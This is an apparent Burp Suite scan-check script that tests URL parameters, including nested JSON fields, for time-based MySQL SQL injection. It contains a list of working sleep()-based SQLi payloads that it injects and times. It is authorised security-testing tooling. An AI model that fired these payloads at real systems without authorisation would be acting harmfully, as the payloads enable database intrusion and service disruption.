id: a7b2c4d6-e8f0-4a2b-9c1d-3e5f7a8b9c0d
name: MySQL Time-Based Active Scan (Per Request)
function: SCAN_CHECK_ACTIVE_PER_REQUEST
location: SCANNER
source: |
  /**
  * Detects time-based MySQL SQL injection - runs once per request.
  * Iterates through ALL URL parameters directly (like the Repeater version).
  * Handles both regular parameters and JSON-encoded parameters in GET requests.
  * Tests empty JSON fields as both strings and arrays.
  * Uses manual timing for accurate measurement in concurrent scans.
  * @author slicingmelon
  **/
  
  // Debug: Log when bambda starts
  logging().logToOutput("[MySQLTimeBased] Starting scan check...");
  
  // Check if we have a valid request
  if (requestResponse == null || requestResponse.request() == null) {
    logging().logToError("[MySQLTimeBased] No request available");
    return AuditResult.auditResult();
  }
  
  logging().logToOutput("[MySQLTimeBased] Request URL: " + requestResponse.request().url());
  
  // Configurable sleep time (in seconds)
  var DEFAULT_SLEEP_TIME = 15;
  var SLEEP_PLACEHOLDER = "§§§SLEEP_TIME§§§";
  
  var payloadTemplates = java.util.List.of(
    "'XOR(if(isnull(nullif(now(),sysdate())),sleep(§§§SLEEP_TIME§§§),0))XOR'Z",
    "'(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)'",
    "(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)",
    "(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
    "-(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)",
    ",(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)",
    ",(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
    "'AND(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)AND'Z",
    " AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
    "' AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
    ") AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
    "') AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
    "->test\"',(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z\"'",
    "->test\"' ASC, (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)) DESC-- z\"'",
    "->test\"') XOR (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z\"'"
  );
  
  // Build actual payloads by replacing placeholder with sleep time
  var payloads = payloadTemplates.stream()
    .map(p -> p.replace(SLEEP_PLACEHOLDER, String.valueOf(DEFAULT_SLEEP_TIME)))
    .toList();
  
  // Detection threshold based on sleep time (in milliseconds)
  var detectionThresholdMs = DEFAULT_SLEEP_TIME * 1000L;
  
  // Cache busting
  var bypassCache = true;
  var alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
  
  // Custom URL encode - only encodes space, +, #, = (characters that break URL structure)
  var customUrlEncode = (java.util.function.Function<String, String>)(str -> {
    return str.replace(" ", "%20")
              .replace("+", "%2b")
              .replace("#", "%23")
              .replace("=", "%3D");
  });
  
  // Helper function to minify JSON (smarter - respects string boundaries)
  var minifyJson = (java.util.function.Function<String, String>)(jsonStr -> {
    var sb = new StringBuilder();
    boolean inString = false;
    for (int i = 0; i < jsonStr.length(); i++) {
      char c = jsonStr.charAt(i);
      if (c == '"' && (i == 0 || jsonStr.charAt(i - 1) != '\\')) {
        inString = !inString;
        sb.append(c);
        continue;
      }
      if (!inString && Character.isWhitespace(c)) {
        continue; // strip whitespace only outside strings
      }
      sb.append(c);
    }
    return sb.toString();
  });

  // Helper to detect JSON-looking strings (used for recursive parsing)
  var looksLikeJsonString = (java.util.function.Predicate<String>)(str -> {
    if (str == null) return false;
    var trimmed = str.strip();
    if (trimmed.length() < 2) return false;
    char first = trimmed.charAt(0);
    char last = trimmed.charAt(trimmed.length() - 1);
    if ((first == '{' && last == '}') || (first == '[' && last == ']')) {
      try {
        return api().utilities().jsonUtils().isValidJson(trimmed);
      } catch (Exception ignored) {
        return false;
      }
    }
    return false;
  });

  // Helper to copy original JSON entries when building mutated variants
  var copyJsonEntry = (java.util.function.BiConsumer<JsonObjectNode, java.util.Map.Entry<String, JsonNode>>)((dest, srcEntry) -> {
    var key = srcEntry.getKey();
    var valueNode = srcEntry.getValue();
    if (valueNode.isString()) {
      dest.putString(key, valueNode.asString());
    } else if (valueNode.isNull()) {
      dest.put(key, JsonNullNode.jsonNullNode());
    } else {
      dest.put(key, valueNode);
    }
  });

  // Helper to join nested JSON paths (handles array index notation)
  var joinFieldPath = (java.util.function.BiFunction<String, String, String>)((base, suffix) -> {
    if (base == null || base.isEmpty()) return suffix;
    if (suffix == null || suffix.isEmpty()) return base;
    if (suffix.startsWith("[")) {
      return base + suffix;
    }
    return base + "." + suffix;
  });

  // Helper to format nested keys for array elements
  var formatNestedKey = (java.util.function.Function<String, String>)(key -> {
    if (key == null || key.isEmpty()) return "";
    if (key.startsWith("[")) {
      return key;
    }
    return "." + key;
  });

  // Helper function to inject payload into a JSON string (recursive for nested structures)
  var injectIntoJson = new java.util.function.BiFunction<String, String, java.util.List<java.util.Map.Entry<String, String>>>() {
    @Override
    public java.util.List<java.util.Map.Entry<String, String>> apply(String jsonStr, String payload) {
      var results = new java.util.ArrayList<java.util.Map.Entry<String, String>>();
      try {
        var jsonNode = JsonNode.jsonNode(jsonStr);
        if (jsonNode.isObject()) {
          processObject(jsonNode.asObject(), payload, results);
        } else if (jsonNode.isArray()) {
          processArray(jsonNode.asArray(), payload, results);
        }
      } catch (Exception e) {
        logging().logToError("[MySQLTimeBased] Failed to parse JSON: " + e.getMessage());
      }
      return results;
    }

    private void processObject(JsonObjectNode jsonObj, String payload, java.util.List<java.util.Map.Entry<String, String>> results) {
      var jsonMap = jsonObj.asMap();

      for (var entry : jsonMap.entrySet()) {
        String targetKey = entry.getKey();
        var targetValueNode = entry.getValue();

        if (targetValueNode.isString() || targetValueNode.isNull()) {
          handleStringField(jsonMap, targetKey, targetValueNode, payload, results);
        }

        if (targetValueNode.isArray()) {
          handleArrayField(jsonMap, targetKey, targetValueNode.asArray(), payload, results);
        }

        if (targetValueNode.isObject()) {
          handleObjectField(jsonMap, targetKey, targetValueNode.asObject(), payload, results);
        }
      }
    }

    private void processArray(JsonArrayNode jsonArray, String payload, java.util.List<java.util.Map.Entry<String, String>> results) {
      int arraySize = jsonArray.asList().size();
      for (int i = 0; i < arraySize; i++) {
        var element = jsonArray.get(i);

        if (element.isString() || element.isNull()) {
          String originalValue = element.isString() ? element.asString() : "";
          var newArray = JsonArrayNode.jsonArrayNode();
          for (int j = 0; j < arraySize; j++) {
            if (j == i) {
              newArray.addString(originalValue + payload);
            } else {
              newArray.add(jsonArray.get(j));
            }
          }
          results.add(new java.util.AbstractMap.SimpleEntry<>(
            "[" + i + "]",
            minifyJson.apply(newArray.toJsonString())
          ));

          if (looksLikeJsonString.test(originalValue)) {
            var nestedMutations = this.apply(originalValue, payload);
            for (var nestedMutation : nestedMutations) {
              var newArrayNested = JsonArrayNode.jsonArrayNode();
              for (int j = 0; j < arraySize; j++) {
                if (j == i) {
                  newArrayNested.addString(nestedMutation.getValue());
                } else {
                  newArrayNested.add(jsonArray.get(j));
                }
              }
              results.add(new java.util.AbstractMap.SimpleEntry<>(
                "[" + i + "]" + formatNestedKey.apply(nestedMutation.getKey()),
                minifyJson.apply(newArrayNested.toJsonString())
              ));
            }
          }
        } else if (element.isArray() || element.isObject()) {
          var nestedMutations = this.apply(element.toJsonString(), payload);
          for (var nestedMutation : nestedMutations) {
            try {
              var mutatedNode = JsonNode.jsonNode(nestedMutation.getValue());
              var newArray = JsonArrayNode.jsonArrayNode();
              for (int j = 0; j < arraySize; j++) {
                if (j == i) {
                  newArray.add(mutatedNode);
                } else {
                  newArray.add(jsonArray.get(j));
                }
              }
              results.add(new java.util.AbstractMap.SimpleEntry<>(
                "[" + i + "]" + formatNestedKey.apply(nestedMutation.getKey()),
                minifyJson.apply(newArray.toJsonString())
              ));
            } catch (Exception ignored) {
              // Skip malformed nested JSON
            }
          }
        }
      }
    }

    private void handleStringField(java.util.Map<String, JsonNode> jsonMap, String targetKey, JsonNode targetValueNode, String payload, java.util.List<java.util.Map.Entry<String, String>> results) {
      String originalValue = targetValueNode.isString() ? targetValueNode.asString() : "";
      boolean isEmpty = originalValue.isEmpty();

      var newJsonObj = JsonObjectNode.jsonObjectNode();
      for (var e : jsonMap.entrySet()) {
        if (e.getKey().equals(targetKey)) {
          String origVal = targetValueNode.isString() ? targetValueNode.asString() : "";
          newJsonObj.putString(e.getKey(), origVal + payload);
        } else {
          copyJsonEntry.accept(newJsonObj, e);
        }
      }
      results.add(new java.util.AbstractMap.SimpleEntry<>(
        targetKey,
        minifyJson.apply(newJsonObj.toJsonString())
      ));

      if (isEmpty) {
        var newJsonObjArray = JsonObjectNode.jsonObjectNode();
        for (var e : jsonMap.entrySet()) {
          if (e.getKey().equals(targetKey)) {
            var payloadArray = JsonArrayNode.jsonArrayNode();
            payloadArray.addString(payload);
            newJsonObjArray.put(e.getKey(), payloadArray);
          } else {
            copyJsonEntry.accept(newJsonObjArray, e);
          }
        }
        results.add(new java.util.AbstractMap.SimpleEntry<>(
          targetKey + "[]",
          minifyJson.apply(newJsonObjArray.toJsonString())
        ));
      }

      if (!originalValue.isEmpty() && looksLikeJsonString.test(originalValue)) {
        var nestedMutations = this.apply(originalValue, payload);
        for (var nestedMutation : nestedMutations) {
          var newJsonObjNested = JsonObjectNode.jsonObjectNode();
          for (var e : jsonMap.entrySet()) {
            if (e.getKey().equals(targetKey)) {
              newJsonObjNested.putString(e.getKey(), nestedMutation.getValue());
            } else {
              copyJsonEntry.accept(newJsonObjNested, e);
            }
          }
          results.add(new java.util.AbstractMap.SimpleEntry<>(
            joinFieldPath.apply(targetKey, nestedMutation.getKey()),
            minifyJson.apply(newJsonObjNested.toJsonString())
          ));
        }
      }
    }

    private void handleArrayField(java.util.Map<String, JsonNode> jsonMap, String targetKey, JsonArrayNode targetArray, String payload, java.util.List<java.util.Map.Entry<String, String>> results) {
      int arraySize = targetArray.asList().size();

      for (int i = 0; i < arraySize; i++) {
        var arrayElement = targetArray.get(i);

        if (arrayElement.isString() || arrayElement.isNull()) {
          var newJsonObj = JsonObjectNode.jsonObjectNode();
          for (var e : jsonMap.entrySet()) {
            if (e.getKey().equals(targetKey)) {
              var newArray = JsonArrayNode.jsonArrayNode();
              for (int j = 0; j < arraySize; j++) {
                var elem = targetArray.get(j);
                if (j == i) {
                  String originalValue = elem.isString() ? elem.asString() : "";
                  newArray.addString(originalValue + payload);
                } else {
                  newArray.add(elem);
                }
              }
              newJsonObj.put(e.getKey(), newArray);
            } else {
              copyJsonEntry.accept(newJsonObj, e);
            }
          }
          results.add(new java.util.AbstractMap.SimpleEntry<>(
            targetKey + "[" + i + "]",
            minifyJson.apply(newJsonObj.toJsonString())
          ));

          String originalValue = arrayElement.isString() ? arrayElement.asString() : "";
          if (!originalValue.isEmpty() && looksLikeJsonString.test(originalValue)) {
            var nestedMutations = this.apply(originalValue, payload);
            for (var nestedMutation : nestedMutations) {
              var newJsonObjNested = JsonObjectNode.jsonObjectNode();
              for (var e : jsonMap.entrySet()) {
                if (e.getKey().equals(targetKey)) {
                  var newArray = JsonArrayNode.jsonArrayNode();
                  for (int j = 0; j < arraySize; j++) {
                    if (j == i) {
                      newArray.addString(nestedMutation.getValue());
                    } else {
                      newArray.add(targetArray.get(j));
                    }
                  }
                  newJsonObjNested.put(e.getKey(), newArray);
                } else {
                  copyJsonEntry.accept(newJsonObjNested, e);
                }
              }
              results.add(new java.util.AbstractMap.SimpleEntry<>(
                joinFieldPath.apply(targetKey + "[" + i + "]", nestedMutation.getKey()),
                minifyJson.apply(newJsonObjNested.toJsonString())
              ));
            }
          }
        } else if (arrayElement.isArray() || arrayElement.isObject()) {
          var nestedMutations = this.apply(arrayElement.toJsonString(), payload);
          for (var nestedMutation : nestedMutations) {
            try {
              var mutatedNode = JsonNode.jsonNode(nestedMutation.getValue());
              var newJsonObj = JsonObjectNode.jsonObjectNode();
              for (var e : jsonMap.entrySet()) {
                if (e.getKey().equals(targetKey)) {
                  var newArray = JsonArrayNode.jsonArrayNode();
                  for (int j = 0; j < arraySize; j++) {
                    if (j == i) {
                      newArray.add(mutatedNode);
                    } else {
                      newArray.add(targetArray.get(j));
                    }
                  }
                  newJsonObj.put(e.getKey(), newArray);
                } else {
                  copyJsonEntry.accept(newJsonObj, e);
                }
              }
              results.add(new java.util.AbstractMap.SimpleEntry<>(
                joinFieldPath.apply(targetKey + "[" + i + "]", nestedMutation.getKey()),
                minifyJson.apply(newJsonObj.toJsonString())
              ));
            } catch (Exception ignored) {
              // Skip malformed nested JSON
            }
          }
        }
      }
    }

    private void handleObjectField(java.util.Map<String, JsonNode> jsonMap, String targetKey, JsonObjectNode targetObject, String payload, java.util.List<java.util.Map.Entry<String, String>> results) {
      var nestedMutations = this.apply(targetObject.toJsonString(), payload);
      for (var nestedMutation : nestedMutations) {
        try {
          var mutatedNode = JsonNode.jsonNode(nestedMutation.getValue());
          var newJsonObj = JsonObjectNode.jsonObjectNode();
          for (var e : jsonMap.entrySet()) {
            if (e.getKey().equals(targetKey)) {
              newJsonObj.put(e.getKey(), mutatedNode);
            } else {
              copyJsonEntry.accept(newJsonObj, e);
            }
          }
          results.add(new java.util.AbstractMap.SimpleEntry<>(
            joinFieldPath.apply(targetKey, nestedMutation.getKey()),
            minifyJson.apply(newJsonObj.toJsonString())
          ));
        } catch (Exception ignored) {
          // Skip malformed nested JSON
        }
      }
    }
  };
  
  var baseRequest = requestResponse.request();
  if (baseRequest == null) {
    logging().logToError("[MySQLTimeBased] baseRequest is null");
    return AuditResult.auditResult();
  }
  
  // Get ALL URL parameters directly (like the Repeater version)
  var urlParameters = baseRequest.parameters().stream()
    .filter(p -> p.type() == HttpParameterType.URL)
    .toList();
  
  logging().logToOutput("[MySQLTimeBased] Found " + urlParameters.size() + " URL parameters");
  
  if (urlParameters.isEmpty()) {
    logging().logToOutput("[MySQLTimeBased] No URL parameters to test");
    return AuditResult.auditResult();
  }
  
  // Iterate through each URL parameter
  for (var parameter : urlParameters) {
    String name = parameter.name();
    String value = parameter.value();
    
    // URL decode the value to check if it's JSON
    var decodedValue = api().utilities().urlUtils().decode(value);
    
    // Check if it's JSON
    if (decodedValue != null && !decodedValue.isEmpty() && 
        decodedValue.strip().startsWith("{") && decodedValue.strip().endsWith("}") &&
        api().utilities().jsonUtils().isValidJson(decodedValue)) {
      
      // Handle JSON parameter - inject into each JSON field
      for (String payload : payloads) {
        java.util.List<java.util.Map.Entry<String, String>> jsonMutations;
        try {
          jsonMutations = injectIntoJson.apply(decodedValue, payload);
        } catch (Exception e) {
          logging().logToError("[MySQLTimeBased] Error creating JSON mutations: " + e.getMessage());
          continue;
        }
        
        for (var jsonMutation : jsonMutations) {
          var jsonField = jsonMutation.getKey();
          var mutatedJson = jsonMutation.getValue();
          
          // Validate mutated JSON is still valid
          try {
            if (!api().utilities().jsonUtils().isValidJson(mutatedJson)) {
              continue;
            }
          } catch (Exception e) {
            continue;
          }
          
          // URL-encode the mutated JSON for proper URL formatting
          String encodedMutatedJson;
          try {
            encodedMutatedJson = api().utilities().urlUtils().encode(mutatedJson);
          } catch (Exception e) {
            logging().logToError("[MySQLTimeBased] Error encoding JSON: " + e.getMessage());
            continue;
          }
          
          // Get raw request as string (simpler approach)
          var requestStr = baseRequest.toByteArray().toString();
          
          // Try to find the parameter - try multiple approaches since encoding may vary
          var mutatedRequestStr = requestStr;
          boolean replaced = false;
          
          try {
            // Use replaceFirst() to only modify URL line, not headers like Referer
            // Attempt 1: Search for URL-encoded version (using Burp's encoder)
            var originalEncodedValue = api().utilities().urlUtils().encode(decodedValue);
            var searchPatternEncoded = java.util.regex.Pattern.quote(name + "=" + originalEncodedValue);
            if (requestStr.contains(name + "=" + originalEncodedValue)) {
              mutatedRequestStr = requestStr.replaceFirst(searchPatternEncoded, java.util.regex.Matcher.quoteReplacement(name + "=" + encodedMutatedJson));
              replaced = true;
            }
            
            // Attempt 2: Search for the raw value (parameter.value() - might be as-is from URL)
            if (!replaced) {
              var searchPatternValue = java.util.regex.Pattern.quote(name + "=" + value);
              if (requestStr.contains(name + "=" + value)) {
                mutatedRequestStr = requestStr.replaceFirst(searchPatternValue, java.util.regex.Matcher.quoteReplacement(name + "=" + encodedMutatedJson));
                replaced = true;
              }
            }
            
            // Attempt 3: Search for raw decoded JSON (if request has unencoded JSON)
            if (!replaced) {
              var searchPatternRaw = java.util.regex.Pattern.quote(name + "=" + decodedValue);
              if (requestStr.contains(name + "=" + decodedValue)) {
                mutatedRequestStr = requestStr.replaceFirst(searchPatternRaw, java.util.regex.Matcher.quoteReplacement(name + "=" + encodedMutatedJson));
                replaced = true;
              }
            }
          } catch (Exception e) {
            logging().logToError("[MySQLTimeBased] Error in string replacement: " + e.getMessage());
            continue;
          }
          
          // Skip if we couldn't find the parameter to replace
          if (!replaced) continue;
          
          // Add cache buster directly to URL string (before " HTTP/1" to avoid parsing issues)
          try {
            if (bypassCache) {
              var cacheBuster = api().utilities().randomUtils().randomString(14, alphabet);
              int httpIdx = mutatedRequestStr.indexOf(" HTTP/1");
              if (httpIdx > 0) {
                mutatedRequestStr = mutatedRequestStr.substring(0, httpIdx) + "&_czb=" + cacheBuster + mutatedRequestStr.substring(httpIdx);
              }
            }
          } catch (Exception e) {
            logging().logToError("[MySQLTimeBased] Error adding cache buster: " + e.getMessage());
          }
          
          // Create and send the mutated request
          HttpRequestResponse result;
          HttpRequest mutatedRequest;
          long elapsedMs;
          try {
            // Create request from ByteArray (like CookiePrefixBypass does)
            var requestBytes = ByteArray.byteArray(mutatedRequestStr);
            mutatedRequest = HttpRequest.httpRequest(baseRequest.httpService(), requestBytes);
          } catch (Exception e) {
            logging().logToError("[MySQLTimeBased] Error creating request: " + e.getMessage());
            var sw = new java.io.StringWriter();
            e.printStackTrace(new java.io.PrintWriter(sw));
            logging().logToError(sw.toString());
            continue;
          }
          
          try {
            long startTime = System.currentTimeMillis();
            result = http.sendRequest(mutatedRequest);
            long endTime = System.currentTimeMillis();
            elapsedMs = endTime - startTime;
          } catch (Exception e) {
            logging().logToError("[MySQLTimeBased] Error sending request (JSON): " + e.getMessage());
            var sw = new java.io.StringWriter();
            e.printStackTrace(new java.io.PrintWriter(sw));
            logging().logToError(sw.toString());
            continue;
          }
          
          if (result == null || !result.hasResponse()) continue;
          
          if (elapsedMs >= detectionThresholdMs) {
            logging().logToOutput("[MySQLTimeBased] FOUND! JSON param '" + name + "' field '" + jsonField + "' took " + elapsedMs + "ms");
            
            var detail = String.format("JSON param '%s' field '%s' with payload '%s' caused %dms delay", 
              name, jsonField, payload, elapsedMs);
            
            // Create the audit issue and return immediately (like example bambdas)
            // Continuing after a finding causes Burp internal crashes
            return AuditResult.auditResult(
              AuditIssue.auditIssue(
                "MySQL Time-Based SQL Injection (JSON)",
                detail,
                "Use parameterized queries to prevent SQL injection.",
                mutatedRequest.url(),
                AuditIssueSeverity.HIGH,
                AuditIssueConfidence.CERTAIN,
                "Time-based SQL injection allows attackers to extract data by observing response delays.",
                "",
                AuditIssueSeverity.HIGH,
                result
              )
            );
          }
        }
      }
    } else {
      // Handle regular parameter - inject directly using raw string replacement
      for (String payload : payloads) {
        // Custom URL encode the payload (only space, +, #, =)
        String encodedPayload;
        try {
          encodedPayload = customUrlEncode.apply(payload);
        } catch (Exception e) {
          continue;
        }
        
        // Get raw request as string (simpler approach)
        var requestStr = baseRequest.toByteArray().toString();
        
        // Find the parameter in the raw request and append payload
        var mutatedRequestStr = requestStr;
        boolean replaced = false;
        
        try {
          // Use replaceFirst() to only modify URL line, not headers like Referer
          // Attempt 1: Search with URL-encoded name and value
          var encodedName = api().utilities().urlUtils().encode(name);
          var encodedValue = api().utilities().urlUtils().encode(value);
          var searchPatternEncoded = encodedName + "=" + encodedValue;
          if (requestStr.contains(searchPatternEncoded)) {
            var pattern = java.util.regex.Pattern.quote(searchPatternEncoded);
            var replacement = java.util.regex.Matcher.quoteReplacement(searchPatternEncoded + encodedPayload);
            mutatedRequestStr = requestStr.replaceFirst(pattern, replacement);
            replaced = true;
          }
          
          // Attempt 2: Search with raw name=value
          if (!replaced) {
            var searchPatternRaw = name + "=" + value;
            if (requestStr.contains(searchPatternRaw)) {
              var pattern = java.util.regex.Pattern.quote(searchPatternRaw);
              var replacement = java.util.regex.Matcher.quoteReplacement(searchPatternRaw + encodedPayload);
              mutatedRequestStr = requestStr.replaceFirst(pattern, replacement);
              replaced = true;
            }
          }
        } catch (Exception e) {
          logging().logToError("[MySQLTimeBased] Error in string replacement (regular): " + e.getMessage());
          continue;
        }
        
        // Skip if we couldn't find the parameter
        if (!replaced) continue;
        
        // Add cache buster directly to URL string (before " HTTP/1")
        try {
          if (bypassCache) {
            var cacheBuster = api().utilities().randomUtils().randomString(14, alphabet);
            int httpIdx = mutatedRequestStr.indexOf(" HTTP/1");
            if (httpIdx > 0) {
              mutatedRequestStr = mutatedRequestStr.substring(0, httpIdx) + "&_czb=" + cacheBuster + mutatedRequestStr.substring(httpIdx);
            }
          }
        } catch (Exception e) {
          // Continue without cache buster
        }
        
        // Create and send the mutated request
        HttpRequestResponse result;
        HttpRequest mutatedRequest;
        long elapsedMs;
        try {
          // Create request from ByteArray (like CookiePrefixBypass does)
          var requestBytes = ByteArray.byteArray(mutatedRequestStr);
          mutatedRequest = HttpRequest.httpRequest(baseRequest.httpService(), requestBytes);
        } catch (Exception e) {
          logging().logToError("[MySQLTimeBased] Error creating request (regular): " + e.getMessage());
          var sw = new java.io.StringWriter();
          e.printStackTrace(new java.io.PrintWriter(sw));
          logging().logToError(sw.toString());
          continue;
        }
        
        try {
          long startTime = System.currentTimeMillis();
          result = http.sendRequest(mutatedRequest);
          long endTime = System.currentTimeMillis();
          elapsedMs = endTime - startTime;
        } catch (Exception e) {
          logging().logToError("[MySQLTimeBased] Error sending request (regular): " + e.getMessage());
          var sw = new java.io.StringWriter();
          e.printStackTrace(new java.io.PrintWriter(sw));
          logging().logToError(sw.toString());
          continue;
        }
        
        if (result == null || !result.hasResponse()) continue;
        
        if (elapsedMs >= detectionThresholdMs) {
          logging().logToOutput("[MySQLTimeBased] FOUND! Param '" + name + "' took " + elapsedMs + "ms");
          
          var detail = String.format("Param '%s' with payload '%s' caused %dms delay", 
            name, payload, elapsedMs);
          
          // Create the audit issue and return immediately (like example bambdas)
          // Continuing after a finding causes Burp internal crashes
          return AuditResult.auditResult(
            AuditIssue.auditIssue(
              "MySQL Time-Based SQL Injection",
              detail,
              "Use parameterized queries to prevent SQL injection.",
              mutatedRequest.url(),
              AuditIssueSeverity.HIGH,
              AuditIssueConfidence.CERTAIN,
              "Time-based SQL injection allows attackers to extract data by observing response delays.",
              "",
              AuditIssueSeverity.HIGH,
              result
            )
          );
        }
      }
    }
  }
  
  // No issues found
  return AuditResult.auditResult();
